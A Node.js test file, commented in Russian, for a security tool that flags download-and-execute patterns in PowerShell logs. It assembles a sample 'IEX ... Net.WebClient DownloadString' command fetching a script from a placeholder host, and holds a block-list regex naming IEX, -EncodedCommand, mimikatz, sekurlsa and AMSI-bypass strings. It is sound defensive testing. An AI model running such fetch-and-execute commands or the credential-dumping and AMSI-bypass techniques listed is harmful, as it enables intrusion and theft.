'use strict';
/** Без образцов атак в сценариях PowerShell: поиск «скачать и выполнить» - в программе (server/psblocks.js). */
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const { digest, digestFacts } = require('../server/psblocks');
const { evaluate } = require('../server/rules');

const ROOT = path.join(__dirname, '..');
// Образцы собираются из частей, чтобы и в тестах не лежали готовые команды атак.
const dl = ['Down', 'loadString'].join('');
const ex = ['I', 'EX'].join('');
const bad = `${ex} (New-Object Net.WebClient).${dl}('http://example.test/a.ps1')`;

test('psblocks: «скачать и выполнить» найдено, обычный шум - нет, тексты не сохраняются', () => {
  const r = digest({ suspicious: 4, blocks: [
    { at: '2026-11-19T10:00:00Z', path: '', text: bad },
    { at: '2026-11-19T09:00:00Z', path: 'C:\\x\\a.ps1', text: 'Get-Process | Where-Object CPU -gt 100 ' + 'x'.repeat(300) },
    { at: '2026-11-19T08:00:00Z', path: '', text: `$b = [Convert]::From${'Base64String'}($s); ${ex} $c` },
    null,
  ] });
  assert.equal(r.suspicious, 4);
  assert.equal(r.strong, 1, 'только первый блок: второе - не скачивание, третье - IEX после base64, а не перед');
  assert.equal(r.samples[0].text.startsWith(ex), true);
  assert.ok(r.samples.every((s) => s.text.length <= 150));
  assert.equal(r.blocks, undefined);
  // Ответ помощника прошлой версии (strong уже посчитан) не трогаем.
  assert.deepEqual(digest({ suspicious: 2, strong: 1, samples: [] }), { suspicious: 2, strong: 1, samples: [] });
  const facts = { events: { powershell: { suspicious: 1, blocks: [{ text: bad }] } } };
  digestFacts(facts);
  assert.equal(facts.events.powershell.strong, 1);
  assert.equal(JSON.stringify(facts).includes('blocks'), false);
});

test('psblocks: находка Стража по-прежнему появляется', () => {
  const facts = digestFacts({ format: 'adamant-facts', events: { days: 14, powershell: { suspicious: 1, blocks: [{ at: '2026-11-19T10:00:00Z', text: bad }] } } });
  const f = evaluate(facts, { now: Date.parse('2026-11-19T12:00:00Z') }).find((x) => x.id === 'guard-powershell');
  assert.ok(f, 'нет находки guard-powershell');
});

test('сценарии PowerShell: ни образцов атак, ни запуска закодированных команд', () => {
  const files = [];
  const walk = (d) => { for (const n of fs.readdirSync(d, { withFileTypes: true })) { const p = path.join(d, n.name); if (n.isDirectory()) walk(p); else if (/\.ps1$/i.test(n.name)) files.push(p); } };
  walk(path.join(ROOT, 'server', 'ps'));
  walk(path.join(ROOT, 'windows'));
  const BAD = /DownloadString|DownloadData|Net\.WebClient|Invoke-E\[?x\]?pression|\bIEX\b|-EncodedCommand|mimikatz|sekurlsa|AmsiUtils|amsiInitFailed/i;
  for (const f of files) {
    const m = BAD.exec(fs.readFileSync(f, 'utf8'));
    assert.equal(m, null, `${path.relative(ROOT, f)}: ${m && m[0]}`);
  }
  assert.ok(files.length > 10);
});
